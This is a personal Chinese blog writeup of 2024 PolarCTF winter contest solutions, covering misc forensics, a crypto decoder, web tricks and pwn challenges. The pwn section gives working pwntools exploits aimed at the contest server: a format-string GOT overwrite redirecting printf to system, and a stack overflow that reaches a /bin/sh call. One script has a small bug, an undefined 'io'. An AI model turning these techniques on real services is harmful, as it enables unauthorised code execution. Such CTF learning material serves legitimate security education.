---
title: "2024PolarCTF冬季赛个人WP"
date: 2024-12-08 18:17:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "PolarCTF"
cnblogs_postid: "18593635"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18593635"
---

# 1.Misc
## 1-1 Sign-in questions
本题思路如下：
对mp3文件进行binwalk提取获得一个rar文件
里面有key.txt和公众号二维码
获得flag
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208180926301-904892094.png)


## 1-6 妖精纪元
本题思路如下：
解压发现一个加密的压缩包和一个docx文件
尝试对文档进行binwalk提取，获得2BF5.rar
之后出现一个“凝固的岁月.exe”，打开，发现图标是很明显的Tkinter默认图标，可以判断这是Python程序编译成exe后的结果
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208180941357-1267004031.png)

随后使用pyinstxtractor-ng.py和pycdc.exe对程序进行逆向
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208180949645-1693755202.png)

成功后打开x.py，发现有一长串base64编码，分析代码可以得知这是图片的base64编码。
使用在线工具base64转图片，得到图片后用binwalk提取出“走入深渊的辞行.mp3”文件。
使用audacity查看音频文件，可以看出来这是摩尔斯密码，肉眼转成摩尔斯密码
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181001809-327101924.png)
得出压缩包密码：YOU'VEH@D@1ONGD@Y
 
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181006286-1580047440.png)

# 2 Crypto
## 2-3 幂数加密了解一下
本题思路如下：
```
ciphertext = "44420122088421088810140108442"
ciphertext = ciphertext.split('0') 
result = ""
for block in ciphertext:    
    sum = 0
    for i in   range(len(block)):  
        sum +=   int(block[i])
    result += chr(65 +   sum - 1)  
print(result)
```
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181022436-1962600483.png)

# 3.Web
## 3-2 井字棋
本题思路如下：
审计代码后不难发现，只需要修改origboard的值强制把自己的棋子放上即可胜利，因此执行如下代码即可。
```
origBoard[3]='O';
document.getElementById('3').innerHTML   ='O';
origBoard[4]='O';
document.getElementById('4').innerHTML   ='O';
origBoard[5]='O';
document.getElementById('5').innerHTML   ='O';
```
其中下面代码是显示O的，上面是修改结果
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181034069-758682015.png)


## 3-3 button
本题思路如下：
打开发现是个按不到的按钮，因此看源代码，发现这个位置很可疑，因此尝试进入
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181041002-571705731.png)

打开页面一片空白，发现flag在注释里
 
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181044294-2019454543.png)

# 4.Pwn
## 1、bllbl_bind_calc
没有附件，直接手搓脚本
第一次成功发现打520次就能获得flag
Exp:
```
from pwn import *
import time
p=remote("1.95.36.136",2144)

p.sendline("haha")
p.sendline("2")
p.sendline("22")

for i in range(510):
        p.recvuntil('看看这道题怎么样：')
        temp = p.recvuntil(b'=')
        temp=temp.decode().replace("="," ")
        ans = eval(temp)
        p.sendline(str(ans))
        p.sendline(' ')
        print(temp,ans,i)
        time.sleep(1)
p.interactive()
```
最后几次手打答案能获得flag（不知道为什么总是卡住）
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181212227-736391251.png)

## 2、tangniu
本题思路如下：
格式化字符串漏洞，偏移为7，用fmtstrpayload，改printf的got表为system的plt表即可
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181302207-369663918.png)
发现打的aaaa(0x61616161)是第七位，因此可以确定偏移为7
Exp:
```
from pwn import *
p=remote('1.95.36.136',2123)

elf = ELF('./tangniu')
printf_got = elf.got['printf']
system_plt = elf.plt['system']

io.sendline(b’s’)

payload = fmtstr_payload(7, {printf_got: system_plt})
p.sendline(payload)
p.interactive()
```
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181405616-527909816.png)

## 3、stack
本题思路如下：
IDA放进去
```
__int64 test1()
{
  _BYTE buf[80]; //   [rsp+0h] [rbp-50h] BYREF
 
  read(0, buf,   0x58uLL);
  return 0LL;
}
int __fastcall main(int argc, const char **argv, const char   **envp)
{
  int v4; // [rsp+Ch]   [rbp-4h] BYREF
 
  init(argc, argv,   envp);
  test1();
    puts("input1:");
    __isoc99_scanf("%d", &v4);
  if ( passwd == 4660   && v4 == 4660 )
      system("/bin/sh");
  return 0;
}
```
如果想要执行指令，那么passwd和v4的值应该为4660，转16进制是0x1234
main函数里面的好写入，直接str(0x1234)即可，
然后看passwd，没有直接的赋值写入，但是test1存在栈溢出，因此利用栈溢出来覆盖return到passwd的地址

![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181448156-310137092.png)

exp：
```
from pwn import *
p=remote('1.95.36.136',2094)
#p=process('./pwn')
payload=b'a'*0x50+p64(0x04033CC+4)
p.send(payload)
p.recvuntil(':')
p.sendline(str(0x1234))
p.interactive()
```
![image](/assets/cnblogs/2024PolarCTF冬季赛个人WP/3539156-20241208181453289-478822466.png)
